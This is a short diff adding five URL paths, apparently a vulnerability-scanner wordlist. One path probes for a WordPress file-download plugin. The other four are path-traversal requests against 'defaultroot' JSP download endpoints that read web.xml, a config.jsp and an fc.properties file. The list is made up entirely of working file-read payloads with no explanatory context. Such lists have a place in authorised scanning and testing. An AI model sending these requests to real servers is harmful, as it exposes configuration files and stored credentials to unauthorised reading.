@@ -1,0 +1,5 @@
+/wp-content/plugins/filedownload/readme.txt
+/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp
+/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
+/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
